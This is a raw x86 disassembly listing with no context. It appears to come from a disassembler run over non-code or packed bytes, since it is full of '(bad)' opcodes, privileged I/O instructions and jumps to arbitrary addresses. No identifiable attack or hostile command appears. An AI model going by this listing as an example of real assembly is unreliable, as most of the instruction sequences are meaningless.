  413d67:	arpl   WORD PTR [ebx],bp
  413d69:	shl    DWORD PTR [edi+0x467d5a04],0x91
  413d70:	pop    ds
  413d71:	mov    esi,0x63954891
  413d76:	gs iret 
  413d78:	push   eax
  413d79:	jno    0x413d82
  413d7b:	retf   
  413d7c:	dec    esi
  413d7d:	jne    0x413d7c
  413d7f:	call   0x4c05cee6
  413d84:	jnp    0x413d5f
  413d86:	xchg   ecx,eax
  413d87:	mov    bl,0x5a
  413d89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d8a:	mov    al,ds:0x992afd7e
  413d8f:	push   cs
  413d90:	rcl    DWORD PTR ds:[edx+esi*4+0x72a63d26],0x3a
  413d99:	dec    ebp
  413d9a:	inc    ebp
  413d9b:	mov    es,ebx
  413d9d:	(bad)  
  413d9e:	icebp  
  413d9f:	xor    BYTE PTR [esi],0xeb
  413da2:	sbb    BYTE PTR [edi+0x29],dl
  413da5:	xchg   ebp,edx
  413da7:	jns    0x413daf
  413da9:	push   cs
  413daa:	leave  
  413dab:	jp     0x413ddb
  413dad:	sahf   
  413dae:	jle    0x413d7b
  413db0:	test   al,0x14
  413db2:	mov    al,ch
  413db4:	jle    0x413dc8
  413db6:	jg     0x413e03
  413db8:	or     eax,0x19884a78
  413dbd:	push   ebp
  413dbe:	test   al,0x2f
  413dc0:	iret   
  413dc1:	adc    eax,0x205da446
  413dc6:	inc    esi
  413dc7:	pop    esp
  413dc8:	das    
  413dc9:	cs scas al,BYTE PTR es:[edi]
  413dcb:	jmp    0xb9b543ee
  413dd0:	lds    ebx,FWORD PTR ds:0xc076f13e
  413dd6:	ins    DWORD PTR es:[edi],dx
  413dd7:	sbb    BYTE PTR [ebx-0x31],0x90
  413ddb:	pop    es
  413ddc:	(bad)  
  413dde:	mov    BYTE PTR [edi],ah
  413de0:	cdq    
  413de1:	dec    ecx
  413de2:	and    al,0x61
  413de4:	and    al,0x45
  413de6:	enter  0x1487,0x74
  413dea:	inc    ecx
  413deb:	xor    esp,edx
  413ded:	add    eax,DWORD PTR [edx]
  413def:	icebp  
  413df0:	sti    
  413df1:	jb     0x413dc3
  413df3:	scas   al,BYTE PTR es:[edi]
  413df4:	xchg   cl,ch
  413df6:	or     esp,DWORD PTR es:[ebx]
  413df9:	loop   0x413dfd
  413dfb:	inc    esi
  413dfc:	call   0x6c710e44
  413e01:	std    
  413e02:	pop    ebp
  413e03:	sbb    al,0x52
  413e05:	dec    esp
  413e06:	or     cl,BYTE PTR [ebx]
  413e08:	push   edx
  413e09:	cmc    
  413e0a:	pop    edi
  413e0b:	shl    DWORD PTR [edx],1
  413e0d:	xchg   edx,eax
  413e0e:	add    dl,BYTE PTR [edi-0x705110ce]
  413e14:	push   ecx
  413e15:	inc    esp
  413e16:	pop    ds
  413e17:	or     BYTE PTR [ecx*4-0x32176152],0xa3
  413e1f:	into   
  413e20:	pop    ss
  413e21:	aaa    
  413e22:	lds    ebp,FWORD PTR [ebx]
  413e24:	adc    eax,ebp
  413e26:	pop    ebp
  413e27:	loopne 0x413dec
  413e29:	xor    esp,edi
  413e2b:	or     BYTE PTR [eax+ecx*8],al
  413e2e:	cs lock ja 0x413e05
  413e32:	xchg   edi,eax
  413e33:	inc    ebp
  413e34:	push   ecx
  413e35:	adc    al,0x57
  413e37:	mov    al,BYTE PTR [ecx+edx*8-0x12]
  413e3b:	push   ecx
  413e3c:	(bad)  
  413e3d:	fnstsw WORD PTR [eax-0x73]
  413e40:	aad    0x27
  413e42:	leave  
  413e43:	or     DWORD PTR ds:0x65b8db05,ebx
  413e49:	adc    eax,0xe392c282
  413e4e:	mov    esi,0xbfa3184e
  413e53:	ja     0x413dd9
  413e55:	add    BYTE PTR [edi],ah
  413e57:	loopne 0x413e14
  413e59:	jo     0x413e0b
  413e5b:	loop   0x413e5a
  413e5d:	punpckhbw mm4,QWORD PTR [ebp*1-0x38e6e7c6]
  413e65:	pop    es
  413e66:	dec    esi
  413e67:	jnp    0x413ee1
  413e69:	pop    eax
  413e6a:	adc    al,0xc0
  413e6c:	dec    edi
  413e6d:	mov    WORD PTR [ebx],es
  413e6f:	xor    esp,DWORD PTR [edi]
  413e71:	rcl    BYTE PTR [ebx+0x60ca783],0x91
  413e78:	test   DWORD PTR [esi-0x7f],esp
  413e7b:	adc    BYTE PTR [ebx-0x77fe23f2],bl
  413e81:	xchg   DWORD PTR [ebp-0x4467b62],eax
  413e87:	shr    BYTE PTR [edx+eax*1],0x26
  413e8b:	and    DWORD PTR [ebx+0x7c],esp
  413e8e:	mov    al,BYTE PTR [esi]
  413e90:	xchg   edx,eax
  413e91:	arpl   WORD PTR [ecx+0x7aa40966],ax
  413e97:	push   0x52f8f82b
  413e9c:	xor    ch,bl
  413e9e:	test   al,0xf
  413ea0:	imul   edi,ebx
  413ea3:	mov    ebx,DWORD PTR [ebp-0x18]
  413ea6:	jmp    0x41412e
  413eab:	rol    bh,cl
  413ead:	leave  
  413eae:	rcr    ecx,1
  413eb0:	rcr    edx,1
  413eb2:	(bad)  
  413eb3:	enter  0x3d11,0x8f
  413eb7:	iret   
  413eb8:	mov    edi,fs
  413eba:	(bad)  
  413ebb:	out    dx,eax
  413ebc:	push   es
  413ebd:	jg     0x413f37
  413ebf:	in     eax,0x7e
  413ec1:	js     0x413f3b
  413ec3:	add    DWORD PTR [esi],esp
  413ec5:	or     ch,BYTE PTR [ebx]
  413ec7:	adc    ch,dh
  413ec9:	push   cs
  413eca:	mov    ebp,0xffe4e633
  413ecf:	call   0xa4b3:0xf1ce96a8
  413ed6:	out    dx,al
  413ed7:	cmp    ebx,edi
  413ed9:	les    esp,FWORD PTR [ecx+0x5f]
  413edc:	xchg   ebp,eax
  413edd:	jne    0x413e60
  413edf:	aam    0x7a
  413ee1:	lods   eax,DWORD PTR ds:[esi]
  413ee2:	cli    
  413ee3:	cmp    DWORD PTR [ebx+0x35e945de],ebp
  413ee9:	ins    DWORD PTR es:[edi],dx
  413eea:	sti    
  413eeb:	test   BYTE PTR [ebp+0x7f],al
  413eee:	rol    BYTE PTR [esi-0x6f],1
  413ef1:	pop    ebx
  413ef2:	xchg   edi,eax
  413ef3:	xor    eax,0x17c14fcb
  413ef8:	(bad)  
  413ef9:	fcom   st(2)
  413efb:	and    esp,esp
  413efd:	in     al,dx
  413efe:	cmp    ch,bl
  413f00:	mov    esp,0x43e44d2d
  413f05:	in     al,dx
  413f06:	test   al,0xe
  413f08:	or     al,0x13
  413f0a:	cmp    al,BYTE PTR [eax+esi*8+0x7f]
  413f0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f0f:	daa    
  413f10:	test   BYTE PTR [eax-0x72e8c5d0],ch
  413f16:	repz mov ebx,0xb68b42b6
  413f1c:	enter  0x3660,0x37
  413f20:	xchg   ebx,eax
  413f21:	lahf   
  413f22:	xchg   esi,eax
  413f23:	jmp    DWORD PTR [ebx+0x24]
  413f26:	or     DWORD PTR [ebp+0x26],0xd0234dc7
  413f2d:	push   edx
  413f2e:	xor    dl,BYTE PTR [ebp+0x37]
  413f31:	push   es
  413f32:	sbb    ch,ch
  413f34:	jmp    0x413f86
  413f36:	mov    edx,0x70eaf24a
  413f3b:	inc    esi
  413f3c:	(bad)  
  413f3e:	scas   al,BYTE PTR es:[edi]
  413f3f:	enter  0xf57c,0xab
  413f43:	loopne 0x413f3d
  413f45:	or     dl,BYTE PTR [ecx-0x501d2d8d]
  413f4b:	jp     0x413f01
  413f4d:	xchg   ecx,eax
  413f4e:	test   al,0xa
  413f50:	retf   
  413f51:	push   0xffffffe2
  413f53:	cdq    
  413f54:	lods   al,BYTE PTR ds:[esi]
  413f55:	dec    ecx
  413f56:	and    DWORD PTR [ebp+0x74],ebp
  413f59:	add    cl,al
  413f5b:	repnz or DWORD PTR [ebp+eiz*4-0x2170aabc],ecx
  413f63:	xchg   ebp,eax
  413f64:	sub    eax,0x874e6b29
  413f69:	loop   0x413f6f
  413f6b:	hlt    
  413f6c:	or     al,0x27
  413f6e:	fadd   DWORD PTR [ecx-0x370a92fd]
  413f74:	and    al,0x7f
  413f76:	dec    esp
  413f77:	aas    
  413f78:	call   0xba3623ac
  413f7d:	push   ds
  413f7e:	ss icebp 
  413f80:	dec    eax
  413f81:	cmp    DWORD PTR [ebx-0x4c],0x36e1bba7
  413f88:	pusha  
  413f89:	test   bl,cl
  413f8b:	(bad)  
  413f8c:	(bad)  
  413f8d:	outs   dx,BYTE PTR ds:[esi]
  413f8e:	mov    ds:0xd27504f2,al
  413f93:	scas   eax,DWORD PTR es:[edi]
  413f94:	aaa    
  413f95:	retf   0x243b
  413f98:	fisub  DWORD PTR [esi+0x3dce33c2]
  413f9e:	call   0x551b:0xc7147740
  413fa5:	jmp    0x414003
  413fa7:	or     ch,BYTE PTR [ecx-0xa2a1c32]
  413fad:	sbb    dl,BYTE PTR [ecx+0x3c]
  413fb0:	push   0x29217cdb
  413fb5:	jmp    0x413fd1
  413fb7:	and    DWORD PTR ds:0x4e6901a2,edi
  413fbd:	fwait
  413fbe:	mov    bh,0x9a
  413fc0:	push   0x31c0bcd6
  413fc5:	outs   dx,DWORD PTR ds:[esi]
  413fc6:	or     DWORD PTR [eax-0x383a6859],esp
  413fcc:	pop    es
  413fcd:	imul   esp,DWORD PTR [edi+ecx*2],0x4f4c79e8
  413fd4:	inc    edx
  413fd5:	jo     0x413fa0
  413fd7:	jle    0x414008
  413fd9:	xor    BYTE PTR [ecx-0x781b8ad0],cl
  413fdf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413fe0:	jb     0x41400e
  413fe2:	add    eax,0xa51c8c74
  413fe7:	xchg   edx,eax
  413fe8:	repnz inc edx
  413fea:	sub    al,BYTE PTR [ebx]
  413fec:	pop    es
  413fed:	lock push esi
  413fef:	fdivr  QWORD PTR [ebx-0x64]
  413ff2:	xchg   esi,eax
  413ff3:	push   eax
  413ff4:	shl    edi,cl
  413ff6:	push   ebp
  413ff7:	xchg   esi,eax
  413ff8:	sub    eax,ebp
  413ffa:	mov    WORD PTR [edx],gs
  413ffc:	(bad)  
  413ffe:	(bad)  
  413fff:	int    0x7f
  414001:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414002:	xchg   ecx,eax
  414003:	lss    edi,FWORD PTR [ecx-0x66f99fd4]
  41400a:	adc    al,0x7c
  41400c:	inc    esp
  41400d:	sar    BYTE PTR [edi+0x1f],cl
  414010:	inc    ecx
  414011:	sbb    eax,esi
  414013:	(bad)  [eax]
  414015:	in     eax,0x9e
  414017:	xor    dl,dh
  414019:	test   al,0xd0
  41401b:	jmp    0x413fee
  41401d:	inc    esp
  41401e:	cmp    al,BYTE PTR es:[ebp+0xd]
  414022:	and    dh,BYTE PTR ds:0xf769a11f
  414028:	fisub  WORD PTR ds:0x9b1919c4
  41402e:	mov    edi,0x41c8af08
  414033:	les    ecx,FWORD PTR [ecx]
  414035:	mov    esi,0x9f1a8358
  41403a:	js     0x41405d
  41403c:	push   0x64acac19
  414041:	(bad)  
  414042:	mov    ecx,ebp
  414044:	stos   BYTE PTR es:[edi],al
  414045:	(bad)  
  414046:	leave  
  414047:	mov    al,0x55
  414049:	(bad)  
  41404a:	sub    edx,DWORD PTR [esi+0x58]
  41404d:	mov    ebx,DWORD PTR [edi-0x3f]
  414050:	lods   al,BYTE PTR ds:[esi]
  414051:	shl    DWORD PTR [ebp+0x26be5ffa],1
  414057:	add    eax,0x1a8d5399
  41405c:	and    BYTE PTR [edx-0x2d],dh
  41405f:	test   al,0x3f
  414061:	mov    edx,ebp
  414063:	shl    BYTE PTR [ecx],0xba
  414066:	loope  0x41409b
  414068:	dec    eax
  414069:	mov    edx,0x4b2c7cf9
  41406e:	inc    ebp
  41406f:	pop    ebp
  414070:	scas   al,BYTE PTR es:[edi]
  414071:	pop    ecx
  414072:	cmp    edi,DWORD PTR [eax-0x59]
  414075:	rcr    edx,1
  414077:	xor    ah,dh
  414079:	stos   DWORD PTR es:[edi],eax
  41407a:	jecxz  0x4140d3
  41407c:	pop    esi
  41407d:	and    eax,0xccd40e9b
  414082:	shl    DWORD PTR [ebx+0x72b90d2],1
  414088:	inc    eax
  414089:	sub    DWORD PTR [edx-0x78b149af],0xfbd3aec4
  414093:	cld    
  414094:	nop
  414095:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414096:	test   DWORD PTR ds:[esi+0x12],ecx
  41409a:	sbb    bh,ah
  41409c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41409d:	pop    ecx
  41409e:	iret   
  41409f:	call   0x74ee:0xcff63d1e
  4140a6:	mov    ch,0x82
  4140a8:	mov    ecx,0x58003c19
  4140ad:	retf   0xbaf1
  4140b0:	out    dx,al
  4140b1:	or     eax,0x79b16ec3
  4140b6:	mov    ah,0x65
  4140b8:	int3   
  4140b9:	adc    al,0xf7
  4140bb:	xor    DWORD PTR [eax-0x6c],eax
  4140be:	rcl    ebx,cl
  4140c0:	fdiv   QWORD PTR ds:[eax]
  4140c3:	das    
  4140c4:	test   eax,0xd860ed48
  4140c9:	adc    al,0x4f
  4140cb:	or     al,0x15
  4140cd:	(bad)  [ecx+esi*8]
  4140d0:	ins    DWORD PTR es:[edi],dx
  4140d1:	xor    dl,dl
  4140d3:	mov    ds:0xe90af4d0,eax
  4140d8:	adc    ecx,DWORD PTR ds:0x31cbbcc7
  4140de:	les    eax,FWORD PTR [edi-0x6ff502ca]
  4140e4:	sub    al,0xeb
  4140e6:	adc    DWORD PTR [eax+0x5358541a],edi
  4140ec:	pop    ecx
  4140ed:	scas   eax,DWORD PTR es:[edi]
  4140ee:	out    dx,eax
  4140ef:	lods   eax,DWORD PTR ds:[esi]
  4140f0:	mov    dh,0x85
  4140f2:	jge    0x414156
  4140f4:	aad    0x51
  4140f6:	inc    eax
  4140f7:	lds    esp,FWORD PTR [eax+0x20]
  4140fa:	pop    eax
  4140fb:	aaa    
  4140fc:	lahf   
  4140fd:	fst    DWORD PTR [esi+eax*2+0x7c4e2ecc]
  414105:	and    BYTE PTR [eax+ebx*2+0x6d2e60f8],ch
  41410c:	test   eax,0x6bc747ae
  414111:	stc    
  414112:	push   0x6912b16f
  414117:	mov    ebx,0xbf14f3ff
  41411c:	cdq    
  41411d:	xor    esi,DWORD PTR [esi-0x26970d8a]
  414123:	jne    0x4141a0
  414125:	arpl   WORD PTR [ebp-0x44],ax
  414128:	shl    DWORD PTR [edx+edi*1+0x1c],cl
  41412c:	dec    edi
  41412d:	push   cs
  41412e:	xor    ebx,eax
  414130:	jmp    0x4143b8
  414135:	les    edi,FWORD PTR [edi]
  414137:	int    0xc9
  414139:	(bad)  
  41413b:	aam    0x3d
  41413d:	mov    eax,ds:0xdd145a14
  414142:	jb     0x4141c2
  414144:	mov    ds:0x787f0454,eax
  414149:	in     eax,0x7e
  41414b:	js     0x4141c5
  41414d:	pop    edx
  41414e:	daa    
  41414f:	(bad)  
  414150:	push   ebp
  414151:	mov    DWORD PTR [edx-0x428ec67c],0xba3b119a
  41415b:	in     al,0x5a
  41415d:	jmp    0x414187
  41415f:	test   DWORD PTR [eax],esp
  414161:	mov    bh,0xf2
  414163:	popf   
  414164:	lods   al,BYTE PTR ds:[esi]
  414165:	pop    esi
  414166:	scas   eax,DWORD PTR es:[edi]
  414167:	push   esi
  414168:	je     0x41416b
  41416a:	mov    dh,0x72
  41416c:	cwde   
  41416d:	in     eax,0x5c
  41416f:	(bad)  
  414170:	sbb    al,0x2d
  414172:	repnz bound ecx,QWORD PTR [ebp+0x507f42a7]
  414179:	add    eax,0x24165b70
  41417e:	inc    edx
  41417f:	ret    
  414180:	dec    eax
  414181:	fmul   DWORD PTR [edx-0x30606aa0]
  414187:	xchg   esp,eax
  414188:	mov    dl,0x98
  41418a:	adc    DWORD PTR [ebx+0x38],ecx
  41418d:	jo     0x4141a2
  41418f:	gs sub al,0x24
  414192:	mov    esi,0xf1759c89
  414197:	push   eax
  414198:	or     al,0xc5
  41419a:	add    al,0x8e
  41419c:	mov    ecx,0x73e8fcf9
  4141a1:	xchg   edx,eax
  4141a2:	lock out 0x9e,eax
  4141a5:	fstp   DWORD PTR [edx]
  4141a7:	cmp    al,0xc4
  4141a9:	popa   
  4141aa:	std    
  4141ab:	inc    ebp
  4141ac:	sbb    al,0xa6
  4141ae:	test   eax,0x1920416
  4141b3:	cwde   
  4141b4:	in     al,0x74
  4141b6:	push   esi
  4141b7:	mov    eax,0x93e96517
  4141bc:	push   edx
  4141bd:	mov    ecx,0xf0dcf637
  4141c2:	and    al,0x26
  4141c4:	and    eax,0x1d7fe097
  4141c9:	or     eax,0xeaae9b88
  4141ce:	xchg   ecx,eax
  4141cf:	mov    ecx,0x15281c3b
  4141d4:	and    BYTE PTR [ebx+esi*4],dh
  4141d7:	scas   eax,DWORD PTR es:[edi]
  4141d8:	dec    ebp
  4141d9:	push   0xffffffb5
  4141db:	mov    ch,0xfa
  4141dd:	cmc    
  4141de:	sbb    ecx,ecx
  4141e0:	jp     0x41419e
  4141e2:	inc    edx
  4141e3:	sbb    BYTE PTR [ecx+0x1497b9f4],0x47
  4141ea:	adc    al,0xc8
  4141ec:	jbe    0x41426a
  4141ee:	(bad)
  4141f2:	jbe    0x4141ce
  4141f4:	aas    
  4141f5:	scas   al,BYTE PTR es:[edi]
  4141f6:	lds    ecx,FWORD PTR [edi+0x7b]
  4141f9:	jmp    0xb4a39a7a
  4141fe:	dec    ecx
  4141ff:	les    edi,FWORD PTR ss:[esi]
  414202:	adc    DWORD PTR [eax-0x3a2d606d],esi
  414208:	stos   DWORD PTR es:[edi],eax
  414209:	shl    BYTE PTR [esi],1
  41420b:	mov    al,0x22
  41420d:	aam    0x9b
  41420f:	mov    DWORD PTR [esi-0x2b],edx
  414212:	mov    esp,0x6d729531
  414217:	cmc    
  414218:	jne    0x414245
  41421a:	sub    eax,0x530e19da
  41421f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414220:	xchg   esi,eax
  414221:	sbb    al,0xa0
  414223:	lock cmp eax,0xc6922f05
  414229:	(bad)  
  41422b:	(bad)  
  41422c:	shl    al,1
  41422e:	jae    0x41426e
  414230:	test   al,0xcd
  414232:	jecxz  0x4141ee
  414234:	cld    
  414235:	inc    eax
  414236:	push   ecx
  414237:	shl    BYTE PTR [eax],0x40
  41423a:	fdivp  st(1),st
  41423c:	shl    DWORD PTR [eax],0x90
  41423f:	jecxz  0x4141e5
  414241:	sbb    BYTE PTR [ebp-0x1d],ah
  414244:	loopne 0x414248
  414246:	dec    eax
  414247:	mov    ss,WORD PTR fs:[edx+0x59a60f0c]
  41424e:	pop    ds
  41424f:	ss loope 0x414223
  414252:	rol    DWORD PTR [eax],0x6c
  414255:	in     al,dx
  414256:	xchg   edi,eax
  414257:	aad    0x40
  414259:	mov    ah,0x7f
  41425b:	lds    edi,FWORD PTR [esp+esi*8]
  41425e:	jb     0x4141fd
  414260:	cwde   
  414261:	aas    
  414262:	push   cs
  414263:	mov    al,BYTE PTR [ecx]
  414265:	push   0x3c
  414267:	inc    BYTE PTR [esi-0x3a]
  41426a:	adc    ebp,esp
  41426c:	retf   
  41426d:	sub    BYTE PTR [esi],dl
  41426f:	rcr    DWORD PTR [ebx-0x51820393],0x78
  414276:	adc    BYTE PTR [esi+0x5],dl
  414279:	dec    ebp
  41427a:	mov    eax,0x1c8fd0ee
  41427f:	push   edx
  414280:	(bad)  
  414281:	fst    st(5)
  414283:	mov    eax,0x6b0054d6
  414288:	push   es
  414289:	lea    ecx,[edi+ebx*1]
  41428c:	lods   eax,DWORD PTR ds:[esi]
  41428d:	inc    edx
  41428e:	(bad)  
  41428f:	retf   0x862e
  414292:	mov    cl,0xca
  414294:	xor    eax,0x68d96f7d
  414299:	ror    ch,cl
  41429b:	xchg   ebp,eax
  41429c:	call   0xe3df:0x3f5c0ed1
  4142a3:	shr    eax,cl
  4142a5:	imul   edx,DWORD PTR [ecx],0xffffff9b
  4142a8:	test   DWORD PTR [eax+0x4e],esp
  4142ab:	mov    dh,0xbb
  4142ad:	repnz lea esp,[edx+0x12]
  4142b1:	ret    0x7d5e
  4142b4:	enter  0xc61f,0x8e
  4142b8:	(bad)  
  4142b9:	cld    
  4142ba:	das    
  4142bb:	bnd jo 0x414260
  4142be:	push   edx
  4142bf:	fdivrp st(2),st
  4142c1:	shl    DWORD PTR [esi+0x3e],0x5f
  4142c5:	imul   edx,DWORD PTR [ebx-0x2d],0xffffffe7
  4142c9:	pop    esi
  4142ca:	push   0xffffff9f
  4142cc:	cmp    eax,0xea298a
  4142d1:	mov    ah,BYTE PTR [ecx+0x5f]
  4142d4:	xchg   esi,eax
  4142d5:	outs   dx,BYTE PTR ds:[esi]
  4142d6:	test   DWORD PTR [eax+0x62bf340b],0x264b9105
  4142e0:	sti    
  4142e1:	push   edi
  4142e2:	jg     0x41430b
  4142e4:	adc    ebp,ecx
  4142e6:	cmp    BYTE PTR [eax],ah
  4142e8:	or     dh,BYTE PTR [eax-0x4e]
  4142eb:	inc    eax
  4142ec:	iret   
  4142ed:	loope  0x4142a5
  4142ef:	xchg   ecx,eax
  4142f0:	xor    cl,BYTE PTR [ebx-0x1c]
  4142f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142f4:	xchg   edx,eax
  4142f5:	xchg   edx,eax
  4142f6:	xchg   ebx,eax
  4142f7:	push   ebx
  4142f8:	icebp  
  4142f9:	jo     0x414365
  4142fb:	loope  0x414322
  4142fd:	and    al,BYTE PTR [edx]
  4142ff:	xor    BYTE PTR [edi+esi*4],al
  414302:	in     al,dx
  414303:	pop    ds
  414304:	inc    ebx
  414305:	sbb    BYTE PTR [esi],dl
  414307:	mov    edi,DWORD PTR [ebx-0xcd802d2]
  41430d:	cs cli 
  41430f:	sub    al,0xb6
  414311:	gs int3 
  414313:	hlt    
  414314:	test   DWORD PTR ds:0x4adb2b87,edx
  41431a:	sbb    BYTE PTR [ebx+0x21e1ae29],ah
  414320:	mov    ch,0x61
  414322:	xchg   DWORD PTR ds:0xd7714acd,edx
  414328:	data16 aas 
  41432a:	call   DWORD PTR [eax-0x72dd4ddb]
  414330:	(bad)  
  414331:	pusha  
  414332:	xchg   esp,eax
  414333:	pop    esp
  414334:	retf   0xa2ab
  414337:	mov    WORD PTR [ebp-0x6c],?
  41433a:	push   ecx
  41433b:	inc    esi
  41433c:	jg     0x414386
  41433e:	push   ecx
  41433f:	sub    ebp,DWORD PTR [eax]
  414341:	in     al,dx
  414342:	inc    esp
  414343:	outs   dx,DWORD PTR ds:[esi]
  414344:	sbb    al,0x27
  414346:	scas   al,BYTE PTR es:[edi]
  414347:	add    DWORD PTR [esi+0x6ad490d5],0xf79dbe95
  414351:	mov    ebp,0xe8a577e9
  414356:	sub    BYTE PTR [esp+ecx*1],dh
  414359:	or     esp,DWORD PTR [ebx]
  41435b:	cld    
  41435c:	and    DWORD PTR [edi+0x4f434d07],esp
  414362:	sbb    BYTE PTR [edi-0xcc8a7a1],0x45
  414369:	ret    
  41436a:	mov    ds:0xb7a99fff,al
  41436f:	xchg   ebx,eax
  414370:	sbb    al,0x9b
  414372:	fst    DWORD PTR [esp+edi*2-0xd]
  414376:	mov    ah,0xc8
  414378:	test   eax,0xa1383730
  41437d:	pop    es
  41437e:	data16 and ch,cl
  414381:	add    ecx,esi
  414383:	sbb    eax,edx
  414385:	shl    BYTE PTR [eax],0x81
  414388:	mov    WORD PTR [ecx-0x55],ds
  41438b:	scas   eax,DWORD PTR es:[edi]
  41438c:	das    
  41438d:	(bad)  
  41438e:	push   edx
  41438f:	lods   eax,DWORD PTR ds:[esi]
  414390:	xchg   edx,eax
  414391:	add    eax,DWORD PTR [ecx-0x76fecfef]
  414397:	retf   
  414398:	mov    ebp,0x80cdeb09
  41439d:	xchg   ebp,eax
  41439e:	mov    al,0xbb
  4143a0:	into   
  4143a1:	add    DWORD PTR [edx+0xb],0x5ee1da09
  4143a8:	test   eax,0x47d94a9f
  4143ad:	jo     0x414423
  4143af:	push   0xe61cbfdb
  4143b4:	add    eax,0x2b6fc05f
  4143b9:	ror    DWORD PTR [ebp+0x72981fbc],1
  4143bf:	xor    al,BYTE PTR [eax]
  4143c1:	cmp    edi,edx
  4143c3:	jbe    0x4129d7
  4143c9:	mov    edx,DWORD PTR [ebp-0xc]
  4143cc:	mov    edi,DWORD PTR [ebp-0x24]
  4143cf:	xor    edx,eax
  4143d1:	add    edx,ecx
  4143d3:	jmp    0x41465b
  4143d8:	(bad)
  4143db:	rcr    bl,1
  4143dd:	fcmovb st,st(5)
  4143df:	rol    DWORD PTR [ebx-0x7f],1
  4143e2:	add    ecx,ebp
  4143e4:	scas   al,BYTE PTR es:[edi]
  4143e5:	mov    ebx,0x9c13f78
  4143ea:	jg     0x414464
  4143ec:	in     eax,0x7e
  4143ee:	js     0x414468
  4143f0:	inc    esi
  4143f1:	lahf   
  4143f2:	shr    ebx,1
  4143f4:	ret    
  4143f5:	test   BYTE PTR [edx],ch
  4143f7:	test   DWORD PTR [ebp-0x27918993],0x976470f1
  414401:	js     0x4143bb
  414403:	in     eax,dx
  414404:	cmp    ecx,edi
  414406:	mov    dh,0x61
  414408:	jmp    0x1485709
  41440d:	pop    edx
  41440e:	test   BYTE PTR [edx],ah
  414410:	jecxz  0x4143c1
  414412:	je     0x4143d1
  414414:	and    al,0xc8
  414416:	mov    bh,BYTE PTR [edx]
  414418:	in     eax,dx
  414419:	fs push ebx
  41441b:	dec    esp
  41441c:	mov    al,0xc0
  41441e:	pop    ecx
  41441f:	push   edi
  414420:	test   DWORD PTR [ecx+0x1feb105c],0xae98f728
  41442a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41442b:	frstor [ebp+0x1289aa1d]
  414431:	xor    eax,0x67091f3f
  414436:	daa    
  414437:	push   eax
  414438:	enter  0xfbb2,0x3
  41443c:	cmp    eax,ebp
  41443e:	sub    DWORD PTR [ebx],0x65db3a3d
  414444:	sub    DWORD PTR [ebx+ecx*8-0x6c],esi
  414448:	jns    0x414404
  41444a:	int3   
  41444b:	add    eax,0xef2dad16
  414450:	neg    BYTE PTR [esi+0x79]
  414453:	or     ebx,DWORD PTR [ebp+0x43]
  414456:	addr16 pushf 
  414458:	mov    ebp,0x3accbb4f
  41445d:	and    esp,DWORD PTR [eax]
  41445f:	mov    ds:0xce33af8f,al
  414464:	or     eax,0xb548fff2
  414469:	inc    ecx
  41446a:	or     esi,ebp
  41446c:	xor    dl,bh
  41446e:	cmp    bl,BYTE PTR [esi]
  414470:	mov    eax,ds:0x92ba289f
  414475:	inc    ebp
  414476:	push   ecx
  414477:	mov    cl,BYTE PTR [ecx-0x471c34ed]
  41447d:	push   edx
  41447e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41447f:	shr    BYTE PTR [ebp+0x9],1
  414482:	fstp   QWORD PTR [ebx+0x1839f435]
  414488:	pop    esi
  414489:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41448a:	aaa    
  41448b:	dec    edx
  41448c:	cmp    BYTE PTR [edx-0x3ce50622],0x59
  414493:	cwde   
  414494:	nop
  414495:	dec    ebx
  414496:	pop    eax
  414497:	xchg   esi,eax
  414498:	out    0x40,al
  41449a:	das    
  41449b:	jnp    0x414432
  41449d:	jg     0x414453
  41449f:	xchg   esp,eax
  4144a0:	cmp    DWORD PTR [edx],esi
  4144a2:	pop    ds
  4144a3:	cld    
  4144a4:	sar    DWORD PTR [eax+0x573e1dec],1
  4144aa:	jae    0x4144fe
  4144ac:	call   0x94f12bba
  4144b1:	xchg   ebp,eax
  4144b2:	int    0x5
  4144b4:	xchg   BYTE PTR cs:[esi-0x22],dh
  4144b8:	stos   BYTE PTR es:[edi],al
  4144b9:	cwde   
  4144ba:	jl     0x41446b
  4144bc:	push   esi
  4144bd:	push   edi
  4144be:	pop    ecx
  4144bf:	push   ebp
  4144c0:	jb     0x4144a1
  4144c2:	add    eax,0x7c6d9e89
  4144c7:	jmp    0x414545
  4144c9:	aad    0xb5
  4144cb:	mov    ch,0x93
  4144cd:	gs push ebx
  4144cf:	rcr    cl,cl
  4144d1:	jmp    0xb2c8ee5d
  4144d6:	sahf   
  4144d7:	mov    al,0x75
  4144d9:	jp     0x4144ad
  4144db:	clc    
  4144dc:	sub    ch,bh
  4144de:	adc    eax,0x3bae11d9
  4144e3:	inc    esp
  4144e4:	inc    esp
  4144e5:	test   eax,0xb524cdb9
  4144ea:	(bad)  
  4144eb:	loop   0x41451a
  4144ed:	aad    0xc
  4144ef:	and    al,BYTE PTR [edx-0x67146027]
  4144f5:	inc    esi
  4144f6:	das    
  4144f7:	sub    eax,0x5ea2ae8
  4144fc:	(bad)  
  4144fd:	in     eax,dx
  4144fe:	iret   
  4144ff:	inc    esp
  414500:	(bad)  
  414501:	cmp    eax,0xf7f7fc5c
  414506:	dec    edx
  414507:	scas   al,BYTE PTR es:[edi]
  414508:	sbb    edi,ebp
  41450a:	ja     0x41454c
  41450c:	xchg   esi,eax
  41450d:	xchg   DWORD PTR [ebp+0x7e],esi
  414510:	pop    eax
  414511:	mov    ds:0x33001d56,eax
  414516:	aas    
  414517:	mov    dh,0xeb
  414519:	push   ecx
  41451a:	lock nop
  41451c:	sub    al,0x50
  41451e:	xchg   esp,eax
  41451f:	mov    ebx,0x732c9b27
  414524:	push   ecx
  414525:	and    BYTE PTR [ebx],0xde
  414528:	pusha  
  414529:	mov    ds:0xf015d225,eax
  41452e:	pop    eax
  41452f:	pop    ss
  414530:	adc    eax,0x9dcd929b
  414535:	cmp    DWORD PTR [esi+ebx*1],esi
  414538:	dec    edx
  414539:	icebp  
  41453a:	out    0x14,al
  41453c:	xchg   ebx,ecx
